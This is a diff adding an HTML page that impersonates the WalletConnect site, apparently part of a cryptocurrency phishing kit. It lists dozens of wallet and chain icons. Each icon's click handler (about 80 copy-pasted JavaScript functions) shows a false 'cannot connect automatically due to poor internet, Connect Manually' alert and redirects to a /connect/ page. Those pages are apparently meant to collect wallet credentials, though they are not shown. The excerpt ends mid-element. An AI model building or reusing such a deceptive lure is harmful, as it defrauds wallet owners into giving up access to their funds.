@@ -1,0 +1,1293 @@
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="./assets/style.css" type="text/css"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Bridge for connecting Wallets to Dapps">
+<meta property="og:image" content="https://walletconnect.org/favicon.ico">
+<link rel="icon" href="https://walletconnect.org/favicon.ico">
+<style type="text/css">
+    
+*{
+    margin : 0;
+    padding : 0;
+    box-sizing: border-box !important;
+    -webkit-appearance: none;
+}
+html, body, #root, #router-root {
+    height: 100%;
+    width: 100%;
+    margin: 0px;
+    padding: 0px;
+}
+body {
+    font-family: -apple-system, system-ui, BlinkMacSystemFont, "SF Pro Text", Roboto, Helvetica, Arial, sans-serif;
+    font-style: normal;
+    font-stretch: normal;
+    font-weight: 400;
+    font-size: 16px;
+    color: rgb(88, 112, 135);
+    overflow-y: auto;
+    text-rendering: optimizelegibility;
+    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    -webkit-font-smoothing: antialiased;
+    text-size-adjust: 100%;
+}
+.top {
+    width: 100%;
+    margin: 0px auto;
+    padding : 23px;
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(50px, 1fr));
+    grid-gap : 10px;
+    margin-bottom : 15px;
+    justify-content : center;
+}
+a.left {
+    color: rgb(88, 120, 188);
+    text-decoration : none;
+    font-weight : 550;
+    font-size : 16px;
+    padding-top : 10px;
+    justify-content : center;
+}
+.top img{
+    width: 100%;
+    max-width: 120px;
+    min-width: 60px;
+    justify-content: center;
+}
+
+.gFeYHJ {
+    font-size: 35px;
+    font-weight: 500;
+    text-align: center;
+}
+.lpfxqP {
+    width : 90%;
+    margin: 30px 0px;
+    font-size: 30px;
+    font-weight: 300;
+    text-align: center;
+}
+.dXgqeu img {
+    width: 100%;
+    padding : 30px;
+}
+.lbvZBb {
+    flex: 1 1 0%;
+    margin: 30px -32px;
+    display: flex;
+    text-align: left;
+    -webkit-box-pack: justify;
+    justify-content: space-between;
+}
+
+a, p, h1, h2, h3, h4, h5, h6 {
+    text-decoration: none;
+    margin: 0px;
+    padding: 0px;
+}
+
+p {
+    display: block;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    margin-inline-start: 0px;
+    margin-inline-end: 0px;
+}
+.bout {
+    padding: 20px;
+    font-size: 17px;
+    font-weight: 300;
+    line-height: 1.35;
+    text-align : left;
+}
+.wallets {
+    padding: 20px;
+    font-size: 18px;
+    font-weight: 300;
+    line-height: 1.35;
+}
+a, p, h1, h2, h3, h4, h5, h6 {
+    text-decoration: none;
+    margin: 0px;
+    padding: 0px;
+}
+h2.home {
+    font-size: 32px;
+    font-weight: 300;
+    color: rgb(46, 67, 88);
+    margin-bottom: 20px;
+}
+h1.home{
+    font-weight : 450;
+    color: rgb(46, 67, 88);
+    margin-bottom: 20px;
+}
+.all {
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(90px, 1fr));
+    grid-gap : 10px;
+}
+.apps {
+    width : 95px;
+    height : auto;
+    padding : 10px;
+    text-align : left;
+    margin : auto;
+    justify-content: center;
+    border: none;
+    border-radius : 10px;
+    box-shadow: 2px 2px 10px 2px #ccc;
+    font-weight: 700;
+    font-size : 60%;
+    text-align : center;
+}
+.apps a{
+    text-align : left;
+}
+.apps img {
+    max-width : 75px;
+    border-radius: 50%;
+    object-fit: cover;
+    margin-bottom : 3px;
+}
+.show {
+    width : auto;
+    height : auto;
+    border : none;
+    border-radius: 5px;
+    font-weight : 700;
+    display : block;
+    padding : 10px;
+}
+.hidden {
+    display : none;
+}
+footer {
+    width : auto;
+    margin-top : 90px;
+    justify-content: center;
+}
+footer a{
+   color : rgb(88, 120, 188);
+   margin-left : 10px;
+   
+}
+footer p {
+    display : flex;
+    height : 20px;
+    justify-content: center;
+    -webkit-box-align: center;
+    align-items: center;
+    padding-left: 0.5em;
+    font-size: 14px;
+    color: rgb(88, 120, 188);
+    font-weight: 500;
+    float : center;
+}
+.footimg {
+    max-width : 20px;
+}
+form {
+    padding : 10px;
+}
+.tab {
+    padding : 8px;
+    overflow: hidden;
+    border-bottom : 2px solid white;
+    background-color: white;
+    margin-left : 0px;
+    margin-right : 0px;
+    display : grid;
+    grid-template-columns : repeat(auto-fit, minmax(50px, 1fr));
+    grid-gap : 0px;
+    margin-top : 20px;
+  }
+  
+.tab button {
+    background-color: inherit;
+    float: left;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    padding: 14px 16px;
+    transition: 0.3s;
+  }
+  
+.tab button:hover {
+    background-color: #DDD;
+    border-radius : 20px;
+    color : black;
+  }
+  
+.tab button.active {
+    background-color: rgb(88, 120, 188);
+    border-radius : 20px;
+    color : white;
+    font-weight : 650;
+  }
+  
+.tabcontent {
+    display: none;
+    color : black;
+    padding: 6px;
+    border-bottom: none;
+    border-top: none;
+    margin-left : 0%;
+    margin-right : 0%;
+  }
+@keyframes fadeEffect {
+    from {opacity: 0;}
+    to {opacity: 1;}
+  }
+textarea {
+    width : 85%;
+    height : 150px;
+    border : 2px solid #BBB;
+    padding : 10px;
+    border-radius : 10px;
+}
+.desc{
+    margin-top : 10px;
+    font-size : 75%;
+    color : rgb(88, 120, 188);
+    font-weight : 700;
+}
+.btn {
+    display : block;
+    width : 85%;
+    height : auto;
+    color : white;
+    background : rgb(42, 73, 141);
+    padding : 12px;
+    border : none;
+    border-radius : 10px;
+    font-weight : 650;
+}
+.btn:hover {
+    background : rgb(81, 122, 209);
+}
+.field input {
+    width : 85%;
+    height : auto;
+    border : 2px solid #BBB;
+    padding : 10px;
+    border-radius : 10px;
+    margin-top : 12px;
+}
+img.barcode {
+    max-width : 250px;
+    margin-top : 70px;
+}
+    
+</style>
+
+<script>
+function show() {
+  var x = document.getElementById("hidden");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+
+  if (x.style.display === "block") {
+    document.getElementById("btn").innerHTML = "Show Less &uarr;";
+  } 
+}
+
+function error1()
+{
+let link = document.getElementById('eror1').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error2()
+{
+let link = document.getElementById('eror2').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error3()
+{
+let link = document.getElementById('eror3').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error4()
+{
+let link = document.getElementById('eror4').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error5()
+{
+let link = document.getElementById('eror5').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error6()
+{
+let link = document.getElementById('eror6').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error7()
+{
+let link = document.getElementById('eror7').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error8()
+{
+let link = document.getElementById('eror8').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error9()
+{
+let link = document.getElementById('eror9').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error10()
+{
+let link = document.getElementById('eror10').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error11()
+{
+let link = document.getElementById('eror11').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error12()
+{
+let link = document.getElementById('eror12').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error13()
+{
+let link = document.getElementById('eror13').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error14()
+{
+let link = document.getElementById('eror14').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error15()
+{
+let link = document.getElementById('eror15').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error16()
+{
+let link = document.getElementById('eror16').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error17()
+{
+let link = document.getElementById('eror17').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error18()
+{
+let link = document.getElementById('eror18').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error19()
+{
+let link = document.getElementById('eror19').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error20()
+{
+let link = document.getElementById('eror20').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error21()
+{
+let link = document.getElementById('eror21').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error22()
+{
+let link = document.getElementById('eror22').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error23()
+{
+let link = document.getElementById('eror23').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error24()
+{
+let link = document.getElementById('eror24').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error25()
+{
+let link = document.getElementById('eror25').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error26()
+{
+let link = document.getElementById('eror26').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error27()
+{
+let link = document.getElementById('eror27').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error28()
+{
+let link = document.getElementById('eror28').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error29()
+{
+let link = document.getElementById('eror29').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error30()
+{
+let link = document.getElementById('eror30').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error31()
+{
+let link = document.getElementById('eror31').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error32()
+{
+let link = document.getElementById('eror32').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error33()
+{
+let link = document.getElementById('eror33').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error34()
+{
+let link = document.getElementById('eror34').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error35()
+{
+let link = document.getElementById('eror35').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error36()
+{
+let link = document.getElementById('eror36').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error37()
+{
+let link = document.getElementById('eror37').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error38()
+{
+let link = document.getElementById('eror38').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error39()
+{
+let link = document.getElementById('eror39').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error40()
+{
+let link = document.getElementById('eror40').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error41()
+{
+let link = document.getElementById('eror41').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error42()
+{
+let link = document.getElementById('eror42').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error43()
+{
+let link = document.getElementById('eror43').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error44()
+{
+let link = document.getElementById('eror44').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error45()
+{
+let link = document.getElementById('eror45').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error46()
+{
+let link = document.getElementById('eror46').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error47()
+{
+let link = document.getElementById('eror47').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error48()
+{
+let link = document.getElementById('eror48').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error49()
+{
+let link = document.getElementById('eror49').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error50()
+{
+let link = document.getElementById('eror50').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error51()
+{
+let link = document.getElementById('eror51').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error52()
+{
+let link = document.getElementById('eror52').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error53()
+{
+let link = document.getElementById('eror53').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error54()
+{
+let link = document.getElementById('eror54').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error55()
+{
+let link = document.getElementById('eror55').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error56()
+{
+let link = document.getElementById('eror56').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error57()
+{
+let link = document.getElementById('eror57').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error58()
+{
+let link = document.getElementById('eror58').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error59()
+{
+let link = document.getElementById('eror59').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+
+function error60()
+{
+let link = document.getElementById('eror60').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error61()
+{
+let link = document.getElementById('eror61').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error62()
+{
+let link = document.getElementById('eror62').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error63()
+{
+let link = document.getElementById('eror63').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error64()
+{
+let link = document.getElementById('eror64').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error65()
+{
+let link = document.getElementById('eror65').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error66()
+{
+let link = document.getElementById('eror66').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error67()
+{
+let link = document.getElementById('eror67').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error68()
+{
+let link = document.getElementById('eror68').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error69()
+{
+let link = document.getElementById('eror69').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error70()
+{
+let link = document.getElementById('eror70').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error71()
+{
+let link = document.getElementById('eror71').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error72()
+{
+let link = document.getElementById('eror72').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error73()
+{
+let link = document.getElementById('eror73').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error74()
+{
+let link = document.getElementById('eror74').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error75()
+{
+let link = document.getElementById('eror75').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error76()
+{
+let link = document.getElementById('eror76').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error77()
+{
+let link = document.getElementById('eror77').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error78()
+{
+let link = document.getElementById('eror78').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error79()
+{
+let link = document.getElementById('eror79').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link;
+}
+
+function error80()
+{
+let link = document.getElementById('eror80').href;
+window.alert("Wallet cannot connect automatically due to poor internet, Connect Manually");
+window.location.href = link; }
+
+</script>
+<title>WalletConnect</title>
+</head>
+<body>
+<center>
+    <div class="top">
+        <a href="#footer?v" class="left">Github</a>
+
+        <a href="#?v" class="left">Docs</a>
+        <a href="/en" class="main"><img src="./assets/logo.svg" alt="logo"></a>
+        <a href="#wallets?v" class="left">Wallets</a>
+        <a href="#?v" class="left">Apps</a>
+</div>
+<br>
+<div class="gFeYHJ">WalletConnect</div>
+
+<div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
+<br>
+
+<div class="dXgqeu">
+<img src="./assets/banner.png" alt="WalletConnect">
+</div>
+
+<div class="bout">
+<h2 class="home">What is WalletConnect?</h2>
+<p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
+A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser 
+extension wallets.</p><br>
+<h2 class="home">How does it work?</h2>
+<p>WalletConnect connects web applications to supported <a href="/#">mobile wallets</a>. WalletConnect session is started by a scanning a QR 
+code (desktop) or by clicking an application deep link (mobile).</p>
+</div>
+
+<div class="wallets" id="wallets">
+    <h1 class="home">Wallets</h1>
+<p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+
+<br>
+<div class="all">
+<div class="apps">
+    <a href="/connect/indexe3b7e3b7e3b7?w=metamask" id="eror1" onclick="error1(); return false;"><img src="./assets/metamask.png"></a><br>
+    MetaMask
+</div>
+
+<div class="apps">
+    <a id="eror2" onclick="error2(); return false;" href="/connect/index38f238f238f2?w=MEW+wallet"><img src="./assets/MEW.png"></a><br>
+    MEW Wallet
+</div>
+
+<div class="apps">
+    <a id="eror3" onclick="error3(); return false;" href="/connect/index211821182118?w=trust+wallet"><img src="./assets/trustwallet.png"></a><br>
+    Trust Wallet
+</div>
+
+<div class="apps">
+    <a id="eror4" onclick="error4(); return false;" href="/connect/indexff05ff05ff05?w=wallet+connect"><img src="./assets/logo.svg"></a><br>
+    Wallect<br>Connect
+</div>
+
+<div class="apps">
+    <a id="eror5" onclick="error5(); return false;" href="/connect/indexdca7dca7dca7?w=coinbase+wallet"><img src="./assets/coinbase.jpg"></a><br>
+    Coinbase Wallet
+</div>
+
+<div class="apps">
+    <a id="eror6" onclick="error6(); return false;" href="/connect/index563856385638?w=POA+network"><img src="./assets/poa.png"></a><br>
+    POA Network
+</div>
+
+<div class="apps">
+    <a id="eror7" onclick="error7(); return false;" href="/connect/index0b9a0b9a0b9a?w=atomic+wallet"><img src="./assets/atomic.png"></a><br>
+    Atomic Wallet
+</div>
+
+<div class="apps">
+    <a id="eror8" onclick="error8(); return false;" href="/connect/index185418541854?w=binance+smart+chain"><img src="./assets/binance.png"></a><br>
+    Binance Smart Chain
+</div>
+
+<div class="apps">
+    <a id="eror9" onclick="error9(); return false;" href="/connect/index366436643664?w=bnb"><img src="./assets/bnb.png"></a><br>
+    BNB
+</div>
+
+<div class="apps">
+    <a id="eror10" onclick="error10(); return false;" href="/connect/index5a305a305a30?w=polkadot"><img src="./assets/polkadot.png"></a><br>
+    Polkadot
+</div>
+
+<div class="apps">
+    <a id="eror11" onclick="error11(); return false;" href="/connect/index297929792979?w=xrp"><img src="./assets/xrp.png"></a><br>
+    XRP
+</div>
+
+<div class="apps">
+    <a id="eror12" onclick="error12(); return false;" href="/connect/indexbd0fbd0fbd0f?w=stellar"><img src="./assets/stellar.png"></a><br>
+    Stell;a
+</div>
+
+<div class="apps">
+    <a id="eror13" onclick="error13(); return false;" href="/connect/indexdf8adf8adf8a?w=tezos"><img src="./assets/tezos.png"></a><br>
+    Tezos
+</div>
+
+<div class="apps">
+    <a id="eror14" onclick="error14(); return false;" href="/connect/index7d1a7d1a7d1a?w=theta"><img src="./assets/theta.png"></a><br>
+    Theta
+</div>
+
+<div class="apps">
+    <a id="eror15" onclick="error15(); return false;" href="/connect/indexcea2cea2cea2?w=tron"><img src="./assets/tron.png"></a><br>
+    Tron
+</div>
+
+<div class="apps">
+    <a id="eror16" onclick="error16(); return false;" href="/connect/indexa71aa71aa71a?w=cosmos"><img src="./assets/cosmos.png"></a><br>
+    Cosmos
+</div>
+
+<div class="apps">
+    <a id="eror17" onclick="error17(); return false;" href="/connect/index071307130713?w=kava"><img src="./assets/kava.png"></a><br>
+    Kava
+</div>
+
+<div class="apps">
+    <a id="eror18" onclick="error18(); return false;" href="/connect/indexcb21cb21cb21?w=filecoin"><img src="./assets/filecoin.png"></a><br>
+    Filecoin
+</div>
+
+<div class="apps">
+    <a id="eror19" onclick="error19(); return false;" href="/connect/indexdf6adf6adf6a?w=solana"><img src="./assets/solana.png"></a><br>
+    Solana
+</div>
+
+<div class="apps">
+    <a id="eror20" onclick="error20(); return false;" href="/connect/index7a807a807a80?w=ethereum+classic"><img src="./assets/ethereum-classic.png"></a><br>
+    Ethereum Classic
+</div>
+
+<div class="apps">
+    <a id="eror21" onclick="error21(); return false;" href="/connect/index8af28af28af2?w=zilliqa"><img src="./assets/zilliqa.png"></a><br>
+    Zilliqa
+</div>
+
+<div class="apps">
+    <a id="eror22" onclick="error22(); return false;" href="/connect/index071207120712?w=elrond"><img src="./assets/elrond.jpg"></a><br>
+    Elrond
+</div>
+
+<div class="apps">
+    <a id="eror23" onclick="error23(); return false;" href="/connect/indexbd88bd88bd88?w=waves"><img src="./assets/waves.png"></a><br>
+    Waves
+</div>
+
+<div class="apps">
+    <a id="eror24" onclick="error24(); return false;" href="/connect/index915e915e915e?w=icon"><img src="./assets/icon.png"></a><br>
+    ICON
+</div>
+
+<div class="apps">
+    <a id="eror25" onclick="error25(); return false;" href="/connect/index14d314d314d3?w=ontology"><img src="./assets/ontology.png"></a><br>
+    Ontology
+</div>
+
+<div class="apps">
+    <a id="eror26" onclick="error26(); return false;" href="/connect/index062006200620?w=trust+vault"><img src="./assets/harmony.jpeg"></a><br>
+    Harmony
+</div>
+
+<div class="apps">
+    <a id="eror27" onclick="error27(); return false;" href="/connect/index062006200620?w=trust+vault"><img src="./assets/parsiq.jpeg"></a><br>
+    Parsiq
+</div>
+
+<div class="apps">
+    <a id="eror28" onclick="error28(); return false;" href="/connect/index062006200620?w=uni+swap"><img src="./assets/uniswap.png"></a><br>
+    Uniswap
+</div>
+
+<div class="apps">
+    <a id="eror29" onclick="error29(); return false;" href="/connect/index062006200620?w=pancakeswap+vault"><img src="./assets/pancakeswap.png"></a><br>
+    PancakeSwap
+</div>
+<div class="apps">
+    <a id="eror30" onclick="error30(); return false;" href="/connect/index062006200620?w=coinomi"><img src="./assets/coinomi.png"></a><br>
+    Coinomi
+</div>
+<div class="apps">
+    <a id="eror31" onclick="error31(); return false;" href="/connect/index062006200620?w=safepal"><img src="./assets/safepal.png"></a><br>
+    Safepal
+</div>
+<div class="apps">
+    <a id="eror32" onclick="error32(); return false;" href="/connect/index062006200620?w=unstoppable+domain"><img src="./assets/unstoppable-domain.png"></a><br>
+    Unstoppable Domains
+</div>
+<div class="apps">
+    <a id="eror33" onclick="error33(); return false;" href="/connect/index062006200620?w=tokenpocket"><img src="./assets/tokenpocket.png"></a><br>
+    Token Pocket
+</div>
+<div class="apps">
+    <a id="eror34" onclick="eror34(); return false;" href="/connect/index062006200620?w=nem"><img src="./assets/nem.png"></a><br>
+    NEM Wallet
+</div>
+<div class="apps">
+    <a id="eror35" onclick="error35(); return false;" href="/connect/index062006200620?w=others"><img src="./assets/btc.png"></a><br>
+    Other Wallet
+</div>
+
+
+</div>
+<br>
+<button onclick="show()" class="btn" id="btn">Show More ↓</button>
+<br><br>
+<div class="hidden" id="hidden">
+<div class="all">
+    
+<div class="apps">
+    <a id="eror36" onclick="error36(); return false;" href="/connect/index1e441e441e44?w=nano"><img src="./assets/nano.png"></a><br>
+    Nano
+</div>
+
+<div class="apps">
+    <a id="eror37" onclick="error37(); return false;" href="/connect/index41db41db41db?w=tomo+chain"><img src="./assets/tomo.png"></a><br>
+    Tomo Chain
+</div>
+
+<div class="apps">
+    <a id="eror38" onclick="error38(); return false;" href="/connect/index250c250c250c?w=iotex"><img src="./assets/iotex.png"></a><br>
+    IoTex
+</div>
+
+<div class="apps">
+    <a id="eror39" onclick="error39(); return false;" href="/connect/index2d9f2d9f2d9f?w=wanchain"><img src="./assets/wanchain.png"></a><br>
+    Wanchain
+</div>
+
+<div class="apps">
+    <a id="eror40" onclick="error40(); return false;" href="/connect/index830c830c830c?w=kin"><img src="./assets/kin.png"></a><br>
+    Kin
+</div>
+
+<div class="apps">
+    <a id="eror41" onclick="error41(); return false;" href="/connect/index473e473e473e?w=nimiq"><img src="./assets/nimiq.png"></a><br>
+    Nimiq
+</div>
+
+<div class="apps">
+    <a id="eror42" onclick="error42(); return false;" href="/connect/index077107710771?w=aion"><img src="./assets/aion.png"></a><br>
+    Aion
+</div>
+
+<div class="apps">
+    <a id="eror43" onclick="error43(); return false;" href="/connect/index578957895789?w=thunder-token"><img src="./assets/thundertoken.png"></a><br>
+    Thunder Token
+</div>
+
+<div class="apps">
+    <a id="eror44" onclick="error44(); return false;" href="/connect/index74d974d974d9?w=aerternity"><img src="./assets/aeternity.png"></a><br>
+    Aeternity
+</div>
+
+<div class="apps">
+    <a id="eror45" onclick="error45(); return false;" href="/connect/index16e716e716e7?w=nebulas"><img src="./assets/nebulas.png"></a><br>
+    Nebulas
+</div>
+
+<div class="apps">
+    <a id="eror46" onclick="error46(); return false;" href="/connect/index99b299b299b2?w=fio"><img src="./assets/fio.png"></a><br>
+    FIO
+</div>
+
+<div class="apps">
+    <a id="eror47" onclick="error47(); return false;" href="/connect/indexeb25eb25eb25?w=gochain"><img src="./assets/gochain.png"></a><br>
+    GoChain
+</div>
+
+
+
+<div class="apps">
+    <a id="eror48" onclick="error48(); return false;" href="/connect/index0f790f790f79?w=callisto"><img src="./assets/callisto.png"></a><br>
+    Callisto
+</div>
+
+<div class="apps">
+    <a id="eror49" onclick="error49(); return false;" href="/connect/indexad44ad44ad44?w=bitpay"><img src="./assets/bitpay.jpg"></a><br>
+    BitPay
+</div>
+
+<div class="apps">
+    <a id="eror50" onclick="error50(); return false;" href="/connect/indexb52ab52ab52a?w=aktionariat"><img src="./assets/aktionariat.png"></a><br>
+    Aktionariat
+</div>
+
+<div class="apps">
+    <a id="eror51" onclick="error51(); return false;" href="/connect/index7d147d147d14?w=atwallet"><img src="./assets/atwallet.png"></a><br>
+    AtWallet
+</div>
+
+<div class="apps">
+    <a id="eror52" onclick="error52(); return false;" href="/connect/index1a6a1a6a1a6a?w=guard+wallet"><img src="./assets/guard.png"></a><br>
+    Guard Wallet
+</div>
+
+<div class="apps">
+    <a id="eror53" onclick="error53(); return false;" href="/connect/indexbbd9bbd9bbd9?w=aave"><img src="./assets/aave.jpg"></a><br>
+    AAVE
+</div>
+
+<div class="apps">
+    <a id="eror54" onclick="error54(); return false;" href="/connect/index6a116a116a11?w=exodus"><img src="./assets/exodus.jpg"></a><br>
+    Exodus
+</div>
+
+
+<div class="apps">
+    <a id="eror55" onclick="error55(); return false;" href="/connect/indexbf5cbf5cbf5c?w=enjin"><img src="./assets/enjin.jpg"></a><br>
+    Enjin
+</div>
+
+
+<div class="apps">
+    <a id="eror56" onclick="error56(); return false;" href="/connect/index1cb01cb01cb0?w=skale"><img src="./assets/skale.png"></a><br>
+    Skale
+</div>
+
+<div class="apps">
+    <a id="eror57" onclick="error57(); return false;" href="/connect/indexd316d316d316?w=portis"><img src="./assets/portis.png"></a><br>
+    Portis
+</div>
+
+<div class="apps">
+    <a id="eror58" onclick="error58(); return false;" href="/connect/index4db64db64db6?w=trezor"><img src="./assets/trezor.png"></a><br>
+    Trezor
+</div>
+
+<div class="apps">
